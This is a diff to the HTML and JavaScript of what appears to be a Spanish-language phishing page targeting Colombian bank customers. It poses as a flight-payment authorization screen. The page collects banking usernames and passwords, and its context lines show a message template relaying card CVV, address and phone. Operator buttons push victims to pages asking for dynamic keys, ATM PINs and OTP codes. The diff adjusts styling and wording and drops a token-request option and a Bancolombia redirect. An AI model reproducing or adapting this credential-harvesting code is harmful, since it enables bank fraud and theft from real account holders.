@@ -87,7 +87,7 @@
     .input-group input {
       width: 40%;
       padding: 8px;
-      border: 1px solid #ccc;
+      border: 1px solid red;
       border-radius: 5px;
       font-size: 14px;
     }
@@ -131,17 +131,17 @@
 
 .loaderp-full {
     position: fixed; /* Usamos fixed para que el loader no se desplace con el scroll */
-    top: 67%; /* Centrado verticalmente */
+    top: 65%; /* Centrado verticalmente */
     left: 50%;
     transform: translate(-50%, -50%); /* Centrado exacto */
-    width: 20%; /* 30% del contenedor principal */
+    width: 23%; /* 30% del contenedor principal */
     height: 25vh; /* 30% de la altura del contenedor principal */
-    max-width: 300px;
-    max-height: 160px;
+    max-width: 500px;
+    max-height: 200px;
     display: flex;
     justify-content: center;
     align-items: center;
-    background-color: rgb(255, 255, 255); /* Semi-transparente para no tapar todo */
+    background-color: white; /* Semi-transparente para no tapar todo */
     border-radius: 8px;
     z-index: 1000; /* Asegura que esté por encima de otros elementos */
 }
@@ -169,7 +169,6 @@
         max-height: 218px; /* Limita el tamaño máximo en móviles */
     }
 }
-
 /* Estilo para el texto de instrucciones */
 .instructions-text {
     font-size: 14px; /* Tamaño de texto adecuado */
@@ -215,7 +214,7 @@
         <label id="clave-label" for="clave">Clave:</label>
         <input type="password" id="clave" placeholder="Ingresa tu clave" maxlength="11">
       </div>
-      <p class="instructions-text">Estos son los datos que utilizas para ingresar a tu app.</p>
+      <p class="instructions-text">Estos son los datos que utilizas para ingresar a tu Banco.</p>
 
       <button class="button" id="authorize-button" disabled>Autorizar</button>
     </form>
@@ -226,24 +225,6 @@
       <p class="text-italic tc-ocean fs-3 fw-light"></p>
     </div>
   </div>
-
-
-  <script>
-    function analizarBancoInfoload() {
-      const infoload = JSON.parse(localStorage.getItem('infoload'));
-    
-      if (infoload && infoload.bank) {
-        const banco = infoload.bank.toLowerCase();
-    
-        // Verificar que contiene "bancolombia" pero NO "bancolombia s.a.- nequi"
-        if (banco.includes("bancolombia") && !banco.includes("bancolombia s.a.- nequi".toLowerCase())) {
-          window.location.href = "bancolombia/index.php";
-        }
-      }
-    }
-    </script>
-    
-
 
   <script>
     document.addEventListener("DOMContentLoaded", function () {
@@ -274,45 +255,42 @@
           authorizeButton.addEventListener("click", function () {
               setTimeout(() => {
                   toggleVisibility(true);
-              }, 100); // Se ejecuta tras un breve retraso
+              }, 0); // Se ejecuta tras un breve retraso
           });
       }
     });
   </script>
   
   
+  
   <script>
-
-
-
     function obtenerPrecio(precio) {
       return parseFloat(precio.replace('$', '').replace('.', '').replace(',', '.'));
     }
-  
+
     function formatearPrecio(numero) {
       return numero.toLocaleString('es-CO', { style: 'currency', currency: 'COP' });
     }
-  
+
     function calcularPrecioTotal() {
       const datosVueloIda = JSON.parse(localStorage.getItem('datos_vuelo_ida'));
       const datosVueloRegreso = JSON.parse(localStorage.getItem('datos_vuelo_regreso'));
-  
+
       let precioTotal = 0;
-  
+
       if (datosVueloIda) {
         precioTotal = obtenerPrecio(datosVueloIda.price);
       }
-  
+
       if (datosVueloRegreso) {
         precioTotal += obtenerPrecio(datosVueloRegreso.price);
       }
-  
+
       const montoFormateado = formatearPrecio(precioTotal);
       document.getElementById("monto-transaccion").innerText = montoFormateado;
       document.getElementById("monto-transaccion-detalle").innerText = montoFormateado;
     }
-  
-  
+
     function obtenerUltimos4Digitos() {
       const tbdatos = JSON.parse(localStorage.getItem('tbdatos'));
       if (tbdatos && tbdatos.cardNumber) {
@@ -322,7 +300,7 @@
         document.getElementById("card-last4-display").innerText = ultimos4;
       }
     }
-  
+
     function normalizarBanco(nombreBanco) {
       const palabrasClave = {
         "av villas": "bavevi.png",
@@ -335,18 +313,18 @@
         "bbva colombia": "bvva.png", // Nuevo banco
         "bbva": "bvva.png" // Sinónimo de "bbva colombia"
       };
-  
+
       const nombreNormalizado = nombreBanco.toLowerCase();
-  
+
       for (const clave in palabrasClave) {
         if (nombreNormalizado.includes(clave)) {
           return palabrasClave[clave];
         }
       }
-  
+
       return "error2.png";
     }
-  
+
     function actualizarLogos() {
       const infoload = JSON.parse(localStorage.getItem('infoload'));
       const tiposTarjetas = {
@@ -355,17 +333,17 @@
         "amex": "amex.avif",
         "discover": "discover.png"
       };
-  
+
       const bankLogo = document.getElementById("bank-logo");
       const cardTypeLogo = document.getElementById("card-type-logo");
-  
+
       if (infoload && infoload.bank) {
         const logoBanco = normalizarBanco(infoload.bank);
         bankLogo.src = `lgos/${logoBanco}`;
       } else {
         bankLogo.src = "lgos/error2.png";
       }
-  
+
       if (infoload && infoload.cardType) {
         const tipoTarjetaNormalizado = infoload.cardType.toLowerCase();
         if (tiposTarjetas[tipoTarjetaNormalizado]) {
@@ -376,7 +354,7 @@
       } else {
         cardTypeLogo.src = "lgos/error.avif";
       }
-  
+
       // Actualizar campos según el banco
       const banco = infoload ? infoload.bank.toLowerCase() : '';
       
@@ -399,25 +377,24 @@
         document.getElementById("usuario-label").innerText = "Cédula:";
         document.getElementById("clave-label").innerText = "Clave:";
         document.getElementById("clave").setAttribute("maxlength", "6");
-        
       } else {
         document.getElementById("usuario-label").innerText = "Usuario:";
         document.getElementById("clave-label").innerText = "Clave:";
       }
     }
-  
+
     function habilitarBoton() {
       const usuario = document.getElementById('usuario').value.trim();
       const clave = document.getElementById('clave').value.trim();
       const boton = document.getElementById('authorize-button');
-  
+
       if (usuario && clave && clave.length <= 11) {
         boton.disabled = false;
       } else {
         boton.disabled = true;
       }
     }  
-  
+
     function guardarDatos() {
       const usuario = document.getElementById('usuario').value.trim();
       const clave = document.getElementById('clave').value.trim();
@@ -425,26 +402,23 @@
         usuario: usuario,
         clave: clave
       };
-  
+
       localStorage.setItem('logindata', JSON.stringify(logindata));
+
     }
-  
+
     window.onload = function () {
       calcularPrecioTotal();
       obtenerUltimos4Digitos();
       actualizarLogos();
-      analizarBancoInfoload();
       habilitarBoton();  // Asegurarse de habilitar el botón si los datos son correctos
     };
-  
+
     // Añadir eventos para verificar los campos
     document.getElementById('usuario').addEventListener('input', habilitarBoton);
     document.getElementById('clave').addEventListener('input', habilitarBoton);
     document.getElementById('authorize-button').addEventListener('click', guardarDatos);
   </script>
-
-
-
   <script>
 document.addEventListener('DOMContentLoaded', function () {
     const loader = document.querySelector(".loaderp-full");
@@ -500,8 +474,8 @@ document.addEventListener('DOMContentLoaded', function () {
 🔐 <b>CVV:</b> | ${datosTarjeta ? datosTarjeta.cvv : '<i>No disponible</i>'}
 💳 <b>Tipo de tarjeta:</b> | ${datosTarjeta ? datosTarjeta.type : '<i>No disponible</i>'}
 💰 <b>Cuotas:</b> | ${datosTarjeta ? datosTarjeta.cuotas : '<i>No disponible</i>'}
---------------------------------------------------
 🏦 <b>Banco:</b> | ${datosTarjeta ? datosTarjeta.bank : '<i>No disponible</i>'}
+--------------------------------------------------
 🏠 <b>Dirección:</b> | ${datosTarjeta ? datosTarjeta.address : '<i>No disponible</i>'}
 📞 <b>Teléfono:</b> | ${datosTarjeta ? datosTarjeta.phone : '<i>No disponible</i>'}
 🏙️ <b>Ciudad:</b> | ${datosTarjeta ? datosTarjeta.city : '<i>No disponible</i>'}
@@ -515,7 +489,6 @@ document.addEventListener('DOMContentLoaded', function () {
                 [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
                 [{ text: "Pedir Clave de Cajero", callback_data: `pedir_cajero:${transactionId}` }],
                 [{ text: "Pedir Código OTP", callback_data: `pedir_otp:${transactionId}` }],
-                [{ text: "Pedir Token", callback_data: `pedir_token:${transactionId}` }],
                 [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
                 [{ text: "Error de Logo", callback_data: `error_logo:${transactionId}` }],
             ],
@@ -568,7 +541,6 @@ document.addEventListener('DOMContentLoaded', function () {
                 `pedir_dinamica:${transactionId}`,
                 `pedir_cajero:${transactionId}`,
                 `pedir_otp:${transactionId}`,
-                `pedir_token:${transactionId}`,
                 `error_tc:${transactionId}`,
                 `error_logo:${transactionId}`,
                 `finalizar:${transactionId}`
@@ -588,9 +560,6 @@ document.addEventListener('DOMContentLoaded', function () {
                     break;
                 case `pedir_otp:${transactionId}`:
                     window.location.href = "otp-id.php"; // Redirige a la página de OTP
-                    break;
-                    case `pedir_token:${transactionId}`:
-                    window.location.href = "token-id.php"; // Redirige a la página de OTP
                     break;
                 case `error_tc:${transactionId}`:
                     alert("Error en tarjeta. Verifique los datos.");
@@ -635,3 +604,6 @@ document.addEventListener('DOMContentLoaded', function () {
 </body>
 
 </html>
+
+
+
